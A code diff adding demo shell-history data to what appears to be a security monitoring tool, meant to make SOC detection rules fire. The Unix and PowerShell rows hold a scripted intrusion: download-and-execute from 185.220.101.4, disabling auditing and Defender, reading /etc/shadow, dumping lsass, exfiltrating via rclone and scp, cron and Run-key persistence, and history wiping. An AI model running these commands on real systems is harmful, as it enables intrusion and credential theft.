@@ -178,6 +178,67 @@ function buildDemoShortcuts() {
 }
 
 /* -------------------------------------------------------------------------- */
+/* SHELL COMMAND HISTORY                                                        */
+/* -------------------------------------------------------------------------- */
+
+/*
+ * A believable "hands-on-keyboard" session that lines up with the browser demo
+ * (recon, download-and-execute, encoded payloads, defense evasion, credential
+ * access, persistence, exfiltration, history wiping), so most command SOC
+ * rules light up and several commands fall outside business hours.
+ *
+ * Row: [daysAgo, hour, minute, command]
+ */
+const UNIX_COMMAND_ROWS = [
+  /* --- Normal daytime admin work --- */
+  [1, 9, 15, 'ls -la /var/log'],
+  [1, 9, 18, 'cat /etc/os-release'],
+  [1, 9, 26, 'git pull origin main'],
+  [1, 10, 2, 'sudo systemctl status nginx'],
+  [1, 14, 40, 'df -h'],
+  /* --- Nighttime intrusion session --- */
+  [2, 2, 8, 'whoami'],
+  [2, 2, 9, 'sudo -l'],
+  [2, 2, 12, 'uname -a'],
+  [2, 2, 14, 'nmap -sV -p- 10.0.0.0/24'],
+  [2, 2, 21, 'curl -s http://185.220.101.4/enum.sh | bash'],
+  [2, 2, 33, 'wget http://185.220.101.4/lin_exploit -O /tmp/le && chmod +x /tmp/le'],
+  [2, 2, 40, 'echo ZXhmaWx0cmF0ZSBub3c= | base64 -d'],
+  [2, 2, 47, 'setenforce 0'],
+  [2, 2, 48, 'sudo systemctl stop auditd'],
+  [2, 2, 55, 'sudo cat /etc/shadow'],
+  [2, 3, 1, 'cp /etc/shadow /tmp/.s && tar czf /tmp/.loot.tgz /home /tmp/.s'],
+  [2, 3, 6, 'rclone copy /tmp/.loot.tgz remote:exfil'],
+  [2, 3, 9, 'scp /tmp/.loot.tgz attacker@185.220.101.4:/data'],
+  [2, 3, 12, '(crontab -l; echo "*/10 * * * * /tmp/le") | crontab -'],
+  [2, 3, 20, 'history -c'],
+  [2, 3, 20, 'unset HISTFILE'],
+]
+
+// PowerShell equivalents for a Windows host.
+const PS_COMMAND_ROWS = [
+  [1, 9, 12, 'Get-ChildItem C:\\Users'],
+  [1, 9, 20, 'Get-Service | Where-Object Status -eq "Running"'],
+  [1, 11, 5, 'Test-NetConnection intranet.company.local -Port 443'],
+  [2, 2, 10, 'whoami /priv'],
+  [2, 2, 15, 'IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.4/a.ps1")'],
+  [2, 2, 22, 'powershell -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AKQA='],
+  [2, 2, 30, 'Set-MpPreference -DisableRealtimeMonitoring $true'],
+  [2, 2, 44, 'procdump.exe -ma lsass.exe C:\\Windows\\Temp\\l.dmp'],
+  [2, 2, 58, 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\a.exe'],
+  [2, 3, 10, 'Clear-History'],
+]
+
+function buildDemoCommands(rows) {
+  return rows.map(([daysAgo, hour, minute, command], index) => ({
+    id: generateId(),
+    command,
+    time: daysAgoAt(daysAgo, hour, minute),
+    lineNo: index + 1,
+  }))
+}
+
+/* -------------------------------------------------------------------------- */
 /* API                                                                         */
 /* -------------------------------------------------------------------------- */
 
@@ -195,4 +256,15 @@ export function getDemoBrowserData(browser) {
     bookmarks: buildDemoBookmarks(),
     shortcuts: supportsShortcuts ? buildDemoShortcuts() : [],
   }
+}
+
+/**
+ * Demonstration command history for a shell: PowerShell gets Windows-style
+ * commands, the POSIX shells share the Unix session.
+ * @param {object} shell shell definition (from config/shells.js)
+ * @returns {{ commands: Array }}
+ */
+export function getDemoShellData(shell) {
+  const rows = shell?.format === 'psreadline' ? PS_COMMAND_ROWS : UNIX_COMMAND_ROWS
+  return { commands: buildDemoCommands(rows) }
 }
